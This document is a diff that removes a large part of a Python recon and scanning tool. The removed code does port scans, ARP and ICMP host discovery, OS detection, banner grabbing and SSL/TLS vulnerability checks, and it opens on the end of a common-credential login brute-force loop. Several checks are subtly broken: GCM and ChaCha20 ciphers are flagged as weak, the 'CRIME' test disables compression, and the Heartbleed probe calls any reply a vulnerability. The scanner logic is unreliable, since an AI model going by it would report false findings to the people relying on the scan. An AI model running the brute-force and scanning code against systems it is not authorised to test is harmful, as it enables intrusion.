-                        self.typewriter_effect(f"   Password: {password}")
-                        
-                        self.vulnerabilities.append({
-                            'type': 'Weak Credentials',
-                            'description': 'Login successful with common credentials',
-                            'severity': 'Critical',
-                            'username': username,
-                            'password': password,
-                            'url': form_url
-                        })
-                        
-                        success = True
-                        break
-                    
-                    time.sleep(0.5)  # Rate limiting
-                
-                except Exception as e:
-                    continue
-            
-            if not success:
-                self.typewriter_effect("\n🔐 No successful logins with common credentials")
-        
-        except Exception as e:
-            self.typewriter_effect(f"❌ Login bruteforce failed: {str(e)}")
-
-    def port_scan(self, target):
-        """Advanced port scanning with multiple techniques"""
-        try:
-            # Parse target and scan type
-            parts = target.split(':')
-            host = parts[0]
-            scan_type = parts[1] if len(parts) > 1 else 'fast'
-            
-            # Validate host
-            try:
-                socket.gethostbyname(host)
-            except socket.gaierror:
-                self.typewriter_effect(f"❌ Invalid host: {host}")
-                return
-            
-            scan_options = {
-                'fast': self.fast_port_scan,
-                'full': self.full_port_scan,
-                'service': self.service_detection_scan,
-                'udp': self.udp_port_scan,
-                'os': self.os_detection_scan
-            }
-            
-            if scan_type not in scan_options:
-                self.typewriter_effect(f"❌ Unknown scan type: {scan_type}. Available: fast, full, service, udp, os")
-                return
-            
-            self.typewriter_effect(f"🌐 Starting {scan_type} scan on: {host}")
-            scan_options[scan_type](host)
-            
-        except Exception as e:
-            self.typewriter_effect(f"❌ Port scan failed: {str(e)}")
     
-    def fast_port_scan(self, host):
-        """Fast scan of common ports"""
-        config = self.port_scan_options['fast_scan']
-        self.typewriter_effect(f"⚡ Fast scanning top {len(config['ports'])} ports on {host}")
-        
-        open_ports = []
-        start_time = time.time()
-        
-        with ThreadPoolExecutor(max_workers=config['threads']) as executor:
-            futures = {executor.submit(self.check_port, host, port, config['timeout'], 'tcp'): port for port in config['ports']}
-            
-            for future in as_completed(futures):
-                port = futures[future]
-                try:
-                    is_open, protocol, banner = future.result()
-                    if is_open:
-                        open_ports.append((port, protocol, banner))
-                        self.typewriter_effect(f"   ✅ {port}/tcp - {protocol} {f'- {banner}' if banner else ''}")
-                except Exception as e:
-                    continue
-        
-        duration = time.time() - start_time
-        self.typewriter_effect(f"\n🔍 Scan completed in {duration:.2f} seconds")
-        self.typewriter_effect(f"📊 Found {len(open_ports)} open ports")
-        
-        if open_ports:
-            self.vulnerabilities.append({
-                'type': 'Open Ports - Fast Scan',
-                'description': f'Found {len(open_ports)} open ports on {host}',
-                'severity': 'Info',
-                'host': host,
-                'ports': [f"{p[0]}/tcp - {p[1]}" for p in open_ports],
-                'banners': [p[2] for p in open_ports if p[2]]
-            })
-            
-            # Check for vulnerable services
-            self.check_vulnerable_services(host, open_ports)
-    
-    def full_port_scan(self, host):
-        """Full port scan (1-65535)"""
-        config = self.port_scan_options['full_scan']
-        self.typewriter_effect(f"🔍 Full scanning all 65535 ports on {host} (this may take a while)")
-        
-        open_ports = []
-        start_time = time.time()
-        scanned = 0
-        total_ports = len(config['ports'])
-        
-        # Split ports into chunks for progress reporting
-        chunk_size = 1000
-        port_chunks = [config['ports'][i:i + chunk_size] for i in range(0, total_ports, chunk_size)]
-        
-        for chunk in port_chunks:
-            chunk_open = []
-            with ThreadPoolExecutor(max_workers=config['threads']) as executor:
-                futures = {executor.submit(self.check_port, host, port, config['timeout'], 'tcp'): port for port in chunk}
-                
-                for future in as_completed(futures):
-                    port = futures[future]
-                    scanned += 1
-                    try:
-                        is_open, protocol, banner = future.result()
-                        if is_open:
-                            chunk_open.append((port, protocol, banner))
-                            self.typewriter_effect(f"   ✅ {port}/tcp - {protocol} {f'- {banner}' if banner else ''}")
-                    except Exception as e:
-                        continue
-            
-            open_ports.extend(chunk_open)
-            progress = (scanned / total_ports) * 100
-            self.typewriter_effect(f"\r🔄 Progress: {progress:.1f}% ({scanned}/{total_ports})", speed=0)
-        
-        duration = time.time() - start_time
-        self.typewriter_effect(f"\n🔍 Scan completed in {duration:.2f} seconds")
-        self.typewriter_effect(f"📊 Found {len(open_ports)} open ports")
-        
-        if open_ports:
-            self.vulnerabilities.append({
-                'type': 'Open Ports - Full Scan',
-                'description': f'Found {len(open_ports)} open ports on {host}',
-                'severity': 'Info',
-                'host': host,
-                'ports': [f"{p[0]}/tcp - {p[1]}" for p in open_ports],
-                'banners': [p[2] for p in open_ports if p[2]]
-            })
-            
-            # Check for vulnerable services
-            self.check_vulnerable_services(host, open_ports)
-    
-    def service_detection_scan(self, host):
-        """Service detection scan with banner grabbing"""
-        config = self.port_scan_options['service_scan']
-        self.typewriter_effect(f"🔍 Service detection scan on {host}")
-        
-        open_ports = []
-        start_time = time.time()
-        
-        with ThreadPoolExecutor(max_workers=config['threads']) as executor:
-            futures = {executor.submit(self.check_port, host, port, config['timeout'], 'tcp', True): port for port in config['ports']}
-            
-            for future in as_completed(futures):
-                port = futures[future]
-                try:
-                    is_open, protocol, banner = future.result()
-                    if is_open:
-                        open_ports.append((port, protocol, banner))
-                        self.typewriter_effect(f"   ✅ {port}/tcp - {protocol} {f'- {banner}' if banner else ''}")
-                except Exception as e:
-                    continue
-        
-        duration = time.time() - start_time
-        self.typewriter_effect(f"\n🔍 Scan completed in {duration:.2f} seconds")
-        self.typewriter_effect(f"📊 Found {len(open_ports)} open ports with service detection")
-        
-        if open_ports:
-            self.vulnerabilities.append({
-                'type': 'Service Detection',
-                'description': f'Service detection on {len(open_ports)} ports on {host}',
-                'severity': 'Info',
-                'host': host,
-                'services': [f"{p[0]}/tcp - {p[1]}" for p in open_ports],
-                'banners': [p[2] for p in open_ports if p[2]]
-            })
-            
-            # Check for vulnerable services
-            self.check_vulnerable_services(host, open_ports)
-    
-    def udp_port_scan(self, host):
-        """UDP port scan"""
-        config = self.port_scan_options['udp_scan']
-        self.typewriter_effect(f"🔍 UDP scanning {len(config['ports'])} ports on {host}")
-        
-        open_ports = []
-        start_time = time.time()
-        
-        with ThreadPoolExecutor(max_workers=config['threads']) as executor:
-            futures = {executor.submit(self.check_port, host, port, config['timeout'], 'udp'): port for port in config['ports']}
-            
-            for future in as_completed(futures):
-                port = futures[future]
-                try:
-                    is_open, protocol, banner = future.result()
-                    if is_open:
-                        open_ports.append((port, protocol, banner))
-                        self.typewriter_effect(f"   ✅ {port}/udp - {protocol} {f'- {banner}' if banner else ''}")
-                except Exception as e:
-                    continue
-        
-        duration = time.time() - start_time
-        self.typewriter_effect(f"\n🔍 Scan completed in {duration:.2f} seconds")
-        self.typewriter_effect(f"📊 Found {len(open_ports)} open UDP ports")
-        
-        if open_ports:
-            self.vulnerabilities.append({
-                'type': 'Open UDP Ports',
-                'description': f'Found {len(open_ports)} open UDP ports on {host}',
-                'severity': 'Info',
-                'host': host,
-                'ports': [f"{p[0]}/udp - {p[1]}" for p in open_ports],
-                'banners': [p[2] for p in open_ports if p[2]]
-            })
-    
-    def os_detection_scan(self, host):
-        """OS detection scan using Nmap"""
-        self.typewriter_effect(f"🔍 Starting OS detection scan on {host}")
-        
-        try:
-            nm = nmap.PortScanner()
-            nm.scan(hosts=host, arguments='-O')
-            
-            if host in nm.all_hosts():
-                host_info = nm[host]
-                
-                if 'osmatch' in host_info:
-                    self.typewriter_effect("\n🖥️ Possible OS Matches:")
-                    for os_match in host_info['osmatch'][:3]:  # Show top 3 matches
-                        self.typewriter_effect(f"   {os_match['name']} (Accuracy: {os_match['accuracy']}%)")
-                    
-                    self.vulnerabilities.append({
-                        'type': 'OS Detection',
-                        'description': 'Operating system detection results',
-                        'severity': 'Info',
-                        'host': host,
-                        'os_matches': [{'name': m['name'], 'accuracy': m['accuracy']} for m in host_info['osmatch'][:3]]
-                    })
-                else:
-                    self.typewriter_effect("❌ Could not detect OS")
-                
-                # Show open ports if any were found during the scan
-                if 'tcp' in host_info:
-                    self.typewriter_effect("\n🔍 Open ports found during OS detection:")
-                    for port in host_info['tcp']:
-                        state = host_info['tcp'][port]['state']
-                        if state == 'open':
-                            service = host_info['tcp'][port]['name']
-                            self.typewriter_effect(f"   {port}/tcp - {service}")
-            else:
-                self.typewriter_effect("❌ Host not reachable for OS detection")
-        
-        except Exception as e:
-            self.typewriter_effect(f"❌ OS detection failed: {str(e)}")
-    
-    def host_discovery(self, network_range):
-        """Network host discovery using ARP and ICMP"""
-        self.typewriter_effect(f"🔍 Starting host discovery on network: {network_range}")
-        
-        try:
-            # Validate network range
-            try:
-                network = ipaddress.ip_network(network_range)
-            except ValueError:
-                self.typewriter_effect("❌ Invalid network range format. Use CIDR notation (e.g., 192.168.1.0/24)")
-                return
-            
-            if network.prefixlen < 16:
-                confirm = input(f"⚠️ Scanning a large network ({network.num_addresses} hosts). Continue? (yes/no): ")
-                if confirm.lower() != 'yes':
-                    return
-            
-            alive_hosts = []
-            
-            # ARP scan for local network discovery
-            self.typewriter_effect("\n🔍 Performing ARP scan...")
-            arp_hosts = self.arp_scan(network)
-            alive_hosts.extend(arp_hosts)
-            
-            # ICMP ping sweep for additional hosts
-            self.typewriter_effect("\n🔍 Performing ICMP ping sweep...")
-            icmp_hosts = self.icmp_sweep(network)
-            alive_hosts.extend(h for h in icmp_hosts if h not in alive_hosts)
-            
-            # Remove duplicates and sort
-            alive_hosts = sorted(list(set(alive_hosts)))
-            
-            self.typewriter_effect("\n🖥️ Alive hosts found:")
-            for host in alive_hosts:
-                try:
-                    hostname = socket.gethostbyaddr(host)[0]
-                    self.typewriter_effect(f"   {host} ({hostname})")
-                except:
-                    self.typewriter_effect(f"   {host}")
-            
-            self.vulnerabilities.append({
-                'type': 'Host Discovery',
-                'description': f'Found {len(alive_hosts)} alive hosts on {network_range}',
-                'severity': 'Info',
-                'network': network_range,
-                'hosts': alive_hosts
-            })
-            
-        except Exception as e:
-            self.typewriter_effect(f"❌ Host discovery failed: {str(e)}")
-    
-    def arp_scan(self, network):
-        """ARP scan for local network host discovery"""
-        hosts = []
-        
-        try:
-            # Create ARP request packet
-            arp_request = scapy.ARP(pdst=str(network))
-            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-            arp_request_broadcast = broadcast/arp_request
-            
-            # Send and receive packets with timeout
-            answered = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
-            
-            for element in answered:
-                hosts.append(element[1].psrc)
-        
-        except Exception as e:
-            self.typewriter_effect(f"⚠️ ARP scan failed: {str(e)}")
-        
-        return hosts
-    
-    def icmp_sweep(self, network):
-        """ICMP ping sweep for host discovery"""
-        hosts = []
-        
-        try:
-            with ThreadPoolExecutor(max_workers=50) as executor:
-                futures = {executor.submit(self.check_host_icmp, str(host)): host for host in network.hosts()}
-                
-                for future in as_completed(futures):
-                    host = futures[future]
-                    try:
-                        if future.result():
-                            hosts.append(str(host))
-                            self.typewriter_effect(f"\r🖥️ Found alive host: {host}", speed=0)
-                    except:
-                        continue
-        
-        except Exception as e:
-            self.typewriter_effect(f"⚠️ ICMP sweep failed: {str(e)}")
-        
-        return hosts
-    
-    def check_host_icmp(self, host):
-        """Check if host responds to ICMP ping"""
-        try:
-            # Linux/Mac
-            if os.name == 'posix':
-                response = subprocess.run(['ping', '-c', '1', '-W', '1', host], 
-                                        stdout=subprocess.PIPE, 
-                                        stderr=subprocess.PIPE).returncode
-                return response == 0
-            # Windows
-            else:
-                response = subprocess.run(['ping', '-n', '1', '-w', '1000', host], 
-                                        stdout=subprocess.PIPE, 
-                                        stderr=subprocess.PIPE).returncode
-                return response == 0
-        except:
-            return False
-    
-    def check_port(self, host, port, timeout=1, protocol='tcp', grab_banner=False):
-        """Check if a port is open and optionally grab banner"""
-        try:
-            if protocol == 'tcp':
-                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                    s.settimeout(timeout)
-                    result = s.connect_ex((host, port))
-                    
-                    if result == 0:
-                        # Port is open, try to get service banner
-                        banner = ''
-                        if grab_banner:
-                            try:
-                                s.send(b'GET / HTTP/1.0\r\n\r\n')
-                                banner = s.recv(1024).decode('utf-8', 'ignore').strip()
-                                if banner:
-                                    banner = banner.split('\n')[0]  # Get first line
-                            except:
-                                pass
-                        
-                        # Try to get service name
-                        try:
-                            service = socket.getservbyport(port, 'tcp')
-                        except:
-                            service = 'unknown'
-                        
-                        return True, service, banner
-            elif protocol == 'udp':
-                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
-                    s.settimeout(timeout)
-                    
-                    # Send dummy data to UDP port (some services respond)
-                    try:
-                        s.sendto(b'\x00', (host, port))
-                        data, _ = s.recvfrom(1024)
-                        if data:
-                            try:
-                                service = socket.getservbyport(port, 'udp')
-                            except:
-                                service = 'unknown'
-                            return True, service, data.decode('utf-8', 'ignore').strip()
-                    except:
-                        pass
-                    
-                    # For some UDP ports, we can check if they're "open" by binding to them
-                    try:
-                        s.bind(('', port))
-                        s.close()
-                        return False, '', ''
-                    except:
-                        try:
-                            service = socket.getservbyport(port, 'udp')
-                        except:
-                            service = 'unknown'
-                        return True, service, ''
-        
-        except Exception as e:
-            pass
-        
-        return False, '', ''
-    
-    def check_vulnerable_services(self, host, open_ports):
-        """Check for services with known vulnerabilities"""
-        vulnerable_services = []
-        
-        for port, protocol, banner in open_ports:
-            if not banner:
-                continue
-                
-            # Normalize protocol name
-            protocol = protocol.lower()
-            if protocol in ['http', 'https']:
-                protocol = 'http'
-            elif protocol in ['microsoft-ds', 'netbios-ssn']:
-                protocol = 'smb'
-            
-            # Check against known vulnerable banners
-            if protocol in self.vulnerable_banners:
-                for vuln_banner, vuln_desc in self.vulnerable_banners[protocol].items():
-                    if vuln_banner.lower() in banner.lower():
-                        vulnerable_services.append((port, protocol, vuln_banner, vuln_desc))
-                        self.typewriter_effect(f"\n⚠️ POTENTIAL VULNERABILITY: {port}/{protocol}")
-                        self.typewriter_effect(f"   Service: {banner}")
-                        self.typewriter_effect(f"   Possible issue: {vuln_desc}")
-        
-        if vulnerable_services:
-            self.vulnerabilities.append({
-                'type': 'Vulnerable Services',
-                'description': 'Services with potential vulnerabilities found',
-                'severity': 'High',
-                'host': host,
-                'services': [f"{p[0]}/{p[1]}" for p in vulnerable_services],
-                'vulnerabilities': [f"{p[3]} (Detected: {p[2]})" for p in vulnerable_services]
-            })
-    
-    def ssl_check(self, host):
-        """Enhanced SSL/TLS configuration check with certificate analysis"""
-        self.typewriter_effect(f"🔒 Starting ENHANCED SSL/TLS check for: {host}")
-        
-        try:
-            # First check if port 443 is open
-            try:
-                with socket.create_connection((host, 443), timeout=5):
-                    pass
-            except:
-                self.typewriter_effect("❌ Port 443 is not open")
-                return
-            
-            # Create SSL context with more options
-            context = ssl.create_default_context()
-            context.set_ciphers('ALL:@SECLEVEL=1')
-            context.check_hostname = True
-            context.verify_mode = ssl.CERT_REQUIRED
-            
-            # Get certificate info using cryptography
-            cert_info = self.get_certificate_info(host)
-            
-            if cert_info:
-                self.typewriter_effect("\n🛠️ SSL Certificate Information:")
-                self.typewriter_effect(f"   Subject: {cert_info['subject']}")
-                self.typewriter_effect(f"   Issuer: {cert_info['issuer']}")
-                self.typewriter_effect(f"   Serial: {cert_info['serial']}")
-                self.typewriter_effect(f"   Valid From: {cert_info['not_before']}")
-                self.typewriter_effect(f"   Valid Until: {cert_info['not_after']}")
-                self.typewriter_effect(f"   Expires In: {cert_info['expires_in']} days")
-                self.typewriter_effect(f"   Signature Algorithm: {cert_info['signature_algorithm']}")
-                self.typewriter_effect(f"   Public Key: {cert_info['public_key']}")
-                self.typewriter_effect(f"   Key Size: {cert_info['key_size']} bits")
-                self.typewriter_effect(f"   DNS Names: {', '.join(cert_info['dns_names'])}")
-                
-                # Check certificate expiration
-                if cert_info['expires_in'] < 30:
-                    self.typewriter_effect(f"\n⚠️ Certificate expires in {cert_info['expires_in']} days!")
-                    self.vulnerabilities.append({
-                        'type': 'SSL Certificate Expiry',
-                        'description': f"Certificate expires in {cert_info['expires_in']} days",
-                        'severity': 'Medium',
-                        'host': host,
-                        'expiry': cert_info['not_after']
-                    })
-                
-                # Check key size
-                if cert_info['key_size'] < 2048:
-                    self.typewriter_effect(f"\n⚠️ Weak RSA key size detected: {cert_info['key_size']} bits (should be at least 2048)")
-                    self.vulnerabilities.append({
-                        'type': 'Weak RSA Key',
-                        'description': f'Weak RSA key size: {cert_info["key_size"]} bits',
-                        'severity': 'High',
-                        'host': host
-                    })
-            
-            # Check supported protocols
-            self.typewriter_effect("\n🔍 Testing supported protocols...")
-            protocols = self.test_ssl_protocols(host)
-            if protocols:
-                self.typewriter_effect("   Supported Protocols:")
-                for proto, version in protocols.items():
-                    self.typewriter_effect(f"   {proto}: {version}")
-                
-                # Check for weak protocols
-                if 'SSLv2' in protocols or 'SSLv3' in protocols:
-                    weak_protos = [p for p in ['SSLv2', 'SSLv3'] if p in protocols]
-                    self.typewriter_effect(f"\n⚠️ Weak protocols enabled: {', '.join(weak_protos)}")
-                    self.vulnerabilities.append({
-                        'type': 'Weak SSL Protocol',
-                        'description': f'Weak protocols enabled: {", ".join(weak_protos)}',
-                        'severity': 'High',
-                        'host': host
-                    })
-            
-            # Check cipher suites
-            self.typewriter_effect("\n🔍 Testing cipher suites...")
-            good_ciphers, weak_ciphers = self.test_cipher_suites(host)
-            
-            if good_ciphers:
-                self.typewriter_effect("\n✅ Strong cipher suites:")
-                for cipher in good_ciphers[:5]:  # Show first 5 strong ciphers
-                    self.typewriter_effect(f"   {cipher}")
-                if len(good_ciphers) > 5:
-                    self.typewriter_effect(f"   ... and {len(good_ciphers)-5} more")
-            
-            if weak_ciphers:
-                self.typewriter_effect("\n⚠️ Weak cipher suites:")
-                for cipher in weak_ciphers[:5]:  # Show first 5 weak ciphers
-                    self.typewriter_effect(f"   {cipher}")
-                if len(weak_ciphers) > 5:
-                    self.typewriter_effect(f"   ... and {len(weak_ciphers)-5} more")
-                
-                self.vulnerabilities.append({
-                    'type': 'Weak Cipher Suites',
-                    'description': f'{len(weak_ciphers)} weak cipher suites enabled',
-                    'severity': 'High',
-                    'host': host,
-                    'weak_ciphers': weak_ciphers[:10]  # Store first 10 weak ciphers
-                })
-            
-            # Check for Heartbleed vulnerability
-            self.typewriter_effect("\n🔍 Checking for Heartbleed vulnerability...")
-            if self.check_heartbleed(host):
-                self.typewriter_effect("💔 HEARTBLEED VULNERABILITY DETECTED!")
-                self.vulnerabilities.append({
-                    'type': 'Heartbleed',
-                    'description': 'OpenSSL Heartbleed vulnerability detected',
-                    'severity': 'Critical',
-                    'host': host
-                })
-            else:
-                self.typewriter_effect("✅ No Heartbleed vulnerability detected")
-            
-            # Check for POODLE vulnerability
-            self.typewriter_effect("\n🔍 Checking for POODLE vulnerability...")
-            if 'SSLv3' in protocols:
-                self.typewriter_effect("⚠️ POODLE VULNERABILITY POSSIBLE (SSLv3 enabled)")
-                self.vulnerabilities.append({
-                    'type': 'POODLE',
-                    'description': 'POODLE vulnerability possible (SSLv3 enabled)',
-                    'severity': 'High',
-                    'host': host
-                })
-            else:
-                self.typewriter_effect("✅ No POODLE vulnerability detected")
-            
-            # Check for CRIME vulnerability
-            self.typewriter_effect("\n🔍 Checking for CRIME vulnerability...")
-            if self.check_crime_vulnerability(host):
-                self.typewriter_effect("⚠️ CRIME VULNERABILITY POSSIBLE (TLS compression enabled)")
-                self.vulnerabilities.append({
-                    'type': 'CRIME',
-                    'description': 'CRIME vulnerability possible (TLS compression enabled)',
-                    'severity': 'Medium',
-                    'host': host
-                })
-            else:
-                self.typewriter_effect("✅ No CRIME vulnerability detected")
-            
-            # Check for BEAST vulnerability
-            self.typewriter_effect("\n🔍 Checking for BEAST vulnerability...")
-            beast_vuln = False
-            if 'TLSv1.0' in protocols:
-                for cipher in weak_ciphers:
-                    if 'CBC' in cipher:
-                        beast_vuln = True
-                        break
-            
-            if beast_vuln:
-                self.typewriter_effect("⚠️ BEAST VULNERABILITY POSSIBLE (TLS 1.0 with CBC cipher)")
-                self.vulnerabilities.append({
-                    'type': 'BEAST',
-                    'description': 'BEAST vulnerability possible (TLS 1.0 with CBC cipher)',
-                    'severity': 'Medium',
-                    'host': host
-                })
-            else:
-                self.typewriter_effect("✅ No BEAST vulnerability detected")
-            
-            # Check for FREAK vulnerability
-            self.typewriter_effect("\n🔍 Checking for FREAK vulnerability...")
-            if self.check_freak_vulnerability(host):
-                self.typewriter_effect("⚠️ FREAK VULNERABILITY DETECTED (Export cipher supported)")
-                self.vulnerabilities.append({
-                    'type': 'FREAK',
-                    'description': 'FREAK vulnerability detected (Export cipher supported)',
-                    'severity': 'High',
-                    'host': host
-                })
-            else:
-                self.typewriter_effect("✅ No FREAK vulnerability detected")
-            
-            # Check for LOGJAM vulnerability
-            self.typewriter_effect("\n🔍 Checking for LOGJAM vulnerability...")
-            if self.check_logjam_vulnerability(host):
-                self.typewriter_effect("⚠️ LOGJAM VULNERABILITY DETECTED (DH EXPORT cipher supported)")
-                self.vulnerabilities.append({
-                    'type': 'LOGJAM',
-                    'description': 'LOGJAM vulnerability detected (DH EXPORT cipher supported)',
-                    'severity': 'High',
-                    'host': host
-                })
-            else:
-                self.typewriter_effect("✅ No LOGJAM vulnerability detected")
-            
-            # Check for DROWN vulnerability
-            self.typewriter_effect("\n🔍 Checking for DROWN vulnerability...")
-            if self.check_drown_vulnerability(host):
-                self.typewriter_effect("💀 DROWN VULNERABILITY DETECTED (SSLv2 enabled)")
-                self.vulnerabilities.append({
-                    'type': 'DROWN',
-                    'description': 'DROWN vulnerability detected (SSLv2 enabled)',
-                    'severity': 'Critical',
-                    'host': host
-                })
-            else:
-                self.typewriter_effect("✅ No DROWN vulnerability detected")
-            
-            # Overall rating
-            vuln_count = sum(1 for v in self.vulnerabilities if v['host'] == host)
-            if vuln_count == 0:
-                self.typewriter_effect("\n🔒 SSL/TLS configuration is STRONG - no vulnerabilities found")
-            elif vuln_count <= 2:
-                self.typewriter_effect(f"\n⚠️ SSL/TLS configuration has {vuln_count} vulnerabilities - needs improvement")
-            else:
-                self.typewriter_effect(f"\n💀 SSL/TLS configuration has {vuln_count} CRITICAL vulnerabilities - immediate action required")
-        
-        except Exception as e:
-            self.typewriter_effect(f"❌ SSL check failed: {str(e)}")
-
-    def get_certificate_info(self, host):
-        """Get detailed certificate information using cryptography"""
-        try:
-            cert_pem = ssl.get_server_certificate((host, 443))
-            cert = x509.load_pem_x509_certificate(cert_pem.encode(), default_backend())
-            
-            # Get subject
-            subject = {}
-            for attr in cert.subject:
-                subject[attr.oid._name] = attr.value
-            subject_str = ', '.join(f"{k}={v}" for k, v in subject.items())
-            
-            # Get issuer
-            issuer = {}
-            for attr in cert.issuer:
-                issuer[attr.oid._name] = attr.value
-            issuer_str = ', '.join(f"{k}={v}" for k, v in issuer.items())
-            
-            # Get validity
-            not_before = cert.not_valid_before.strftime('%Y-%m-%d %H:%M:%S')
-            not_after = cert.not_valid_after.strftime('%Y-%m-%d %H:%M:%S')
-            expires_in = (cert.not_valid_after - datetime.now()).days
-            
-            # Get public key info
-            public_key = cert.public_key()
-            if isinstance(public_key, cryptography.hazmat.primitives.asymmetric.rsa.RSAPublicKey):
-                key_type = "RSA"
-                key_size = public_key.key_size
-            elif isinstance(public_key, cryptography.hazmat.primitives.asymmetric.ec.EllipticCurvePublicKey):
-                key_type = "EC"
-                key_size = public_key.curve.key_size
-            else:
-                key_type = "Unknown"
-                key_size = 0
-            
-            # Get DNS names
-            dns_names = []
-            try:
-                ext = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName)
-                dns_names = ext.value.get_values_for_type(x509.DNSName)
-            except x509.ExtensionNotFound:
-                pass
-            
-            return {
-                'subject': subject_str,
-                'issuer': issuer_str,
-                'serial': cert.serial_number,
-                'not_before': not_before,
-                'not_after': not_after,
-                'expires_in': expires_in,
-                'signature_algorithm': cert.signature_algorithm_oid._name,
-                'public_key': key_type,
-                'key_size': key_size,
-                'dns_names': dns_names
-            }
-        except Exception as e:
-            self.typewriter_effect(f"❌ Failed to get certificate info: {str(e)}")
-            return None
-    
-    def test_ssl_protocols(self, host):
-        """Test which SSL/TLS protocols are supported"""
-        protocols = {
-            'SSLv2': ssl.PROTOCOL_SSLv2,
-            'SSLv3': ssl.PROTOCOL_SSLv3,
-            'TLSv1': ssl.PROTOCOL_TLSv1,
-            'TLSv1.1': ssl.PROTOCOL_TLSv1_1,
-            'TLSv1.2': ssl.PROTOCOL_TLSv1_2,
-            'TLSv1.3': ssl.PROTOCOL_TLS  # In Python 3.7+, this enables TLS 1.3 if available
-        }
-        
-        supported = {}
-        
-        for name, proto in protocols.items():
-            try:
-                context = ssl.SSLContext(proto)
-                context.verify_mode = ssl.CERT_NONE
-                context.check_hostname = False
-                
-                with socket.create_connection((host, 443)) as sock:
-                    with context.wrap_socket(sock, server_hostname=host) as ssock:
-                        # Get actual protocol version negotiated
-                        version = ssock.version()
-                        supported[name] = version
-            except:
-                continue
-        
-        return supported
-    
-    def test_cipher_suites(self, host):
-        """Test which cipher suites are supported"""
-        good_ciphers = []
-        weak_ciphers = []
-        
-        # Test each cipher suite
-        for cipher in self.cipher_suites:
-            try:
-                context = ssl.SSLContext(ssl.PROTOCOL_TLS)
-                context.set_ciphers(cipher)
-                context.verify_mode = ssl.CERT_NONE
-                context.check_hostname = False
-                
-                with socket.create_connection((host, 443)) as sock:
-                    with context.wrap_socket(sock, server_hostname=host) as ssock:
-                        # Check if cipher is weak
-                        if self.is_cipher_weak(cipher):
-                            weak_ciphers.append(cipher)
-                        else:
-                            good_ciphers.append(cipher)
-            except:
-                continue
-        
-        return good_ciphers, weak_ciphers
-    
-    def is_cipher_weak(self, cipher):
-        """Determine if a cipher suite is weak"""
-        weak_keywords = [
-            'NULL', 'EXPORT', 'DES', 'RC2', 'RC4', 'MD5', 
-            'PSK', 'SRP', 'KRB5', 'IDEA', 'SEED', 'CAMELLIA',
-            '3DES', 'ANON', 'CHACHA20', 'GCM', 'POLY1305'
-        ]
-        
-        # First check protocol version
-        protocol = self.cipher_suites.get(cipher, '')
-        if protocol in ['SSL', 'TLS 1.0', 'TLS 1.1']:
-            return True
-        
-        # Then check cipher name
-        for keyword in weak_keywords:
-            if keyword in cipher:
-                return True
-        
-        return False
-    
-    def check_heartbleed(self, host):
-        """Check for Heartbleed vulnerability"""
-        try:
-            context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
-            context.verify_mode = ssl.CERT_NONE
-            context.check_hostname = False
-            
-            with socket.create_connection((host, 443)) as sock:
-                with context.wrap_socket(sock, server_hostname=host) as ssock:
-                    # Send Heartbleed payload
-                    payload = bytearray.fromhex(
-                        "18 03 02 00 03 01 40 00"
-                    )
-                    ssock.send(payload)
-                    
-                    # Wait for response
-                    time.sleep(1)
-                    response = ssock.recv(1024)
-                    
-                    if len(response) > 0:
-                        return True
-        except:
-            pass
-        
-        return False
-    
-    def check_crime_vulnerability(self, host):
-        """Check for CRIME vulnerability (TLS compression)"""
-        try:
-            context = ssl.SSLContext(ssl.PROTOCOL_TLS)
-            context.verify_mode = ssl.CERT_NONE
-            context.check_hostname = False
-            
-            # Enable compression
-            context.options |= ssl.OP_NO_COMPRESSION
-            
-            with socket.create_connection((host, 443)) as sock:
-                with context.wrap_socket(sock, server_hostname=host) as ssock:
-                    # Check if compression was actually enabled
-                    return ssock.compression() is not None
-        except:
-            return False
-    
-    def check_freak_vulnerability(self, host):
-        """Check for FREAK vulnerability (Export ciphers)"""
-        try:
-            context = ssl.SSLContext(ssl.PROTOCOL_TLS)
-            context.set_ciphers('EXPORT')
-            context.verify_mode = ssl.CERT_NONE
-            context.check_hostname = False
-            
-            with socket.create_connection((host, 443)) as sock:
-                with context.wrap_socket(sock, server_hostname=host) as ssock:
-                    return True
-        except:
-            return False
-    
-    def check_logjam_vulnerability(self, host):
-        """Check for LOGJAM vulnerability (DH EXPORT ciphers)"""
-        try:
-            context = ssl.SSLContext(ssl.PROTOCOL_TLS)
-            context.set_ciphers('EDH')
-            context.verify_mode = ssl.CERT_NONE
-            context.check_hostname = False
-            
-            with socket.create_connection((host, 443)) as sock:
-                with context.wrap_socket(sock, server_hostname=host) as ssock:
-                    return True
-        except:
-            return False
-    
-    def check_drown_vulnerability(self, host):
-        """Check for DROWN vulnerability (SSLv2)"""
-        try:
-            context = ssl.SSLContext(ssl.PROTOCOL_SSLv2)
-            context.verify_mode = ssl.CERT_NONE
-            context.check_hostname = False
-            
-            with socket.create_connection((host, 443)) as sock:
-                with context.wrap_socket(sock, server_hostname=host) as ssock:
-                    return True
-        except:
-            return False
-    
-    def scrape_website(self, url):
-        """Enhanced web scraping with HTML/CSS/JS extraction and file saving capability"""
-        self.typewriter_effect(f"📜 Starting ENHANCED web scraping of: {url}")
-        
-        try:
-            response = self.session.get(url, timeout=10)
-            soup = BeautifulSoup(response.text, 'html.parser')
-            
-            # Reset scraped data
-            self.scraped_data = []
-            
-            # Create a directory for scraped files
-            domain = urlparse(url).netloc
-            self.scraped_files_dir = os.path.join(os.getcwd(), f"scraped_{domain}")
-            
-            # Remove old directory if exists
-            if os.path.exists(self.scraped_files_dir):
-                shutil.rmtree(self.scraped_files_dir)
-            
-            # Create new directory structure
-            os.makedirs(self.scraped_files_dir)
-            os.makedirs(os.path.join(self.scraped_files_dir, "css"))
-            os.makedirs(os.path.join(self.scraped_files_dir, "js"))
-            os.makedirs(os.path.join(self.scraped_files_dir, "images"))
-            
-            # Save main HTML file
-            main_html_path = os.path.join(self.scraped_files_dir, "index.html")
-            with open(main_html_path, 'w', encoding='utf-8') as f:
-                f.write(response.text)
-            
-            self.typewriter_effect(f"\n💾 Saved main HTML to: {main_html_path}")
-            
-            # 1. Get full HTML structure
-            self.typewriter_effect("\n🔍 Extracting HTML structure...")
-            html_structure = self.extract_html_structure(soup)
-            self.scraped_data.append({
-                'type': 'HTML Structure',
-                'data': html_structure
-            })
-            
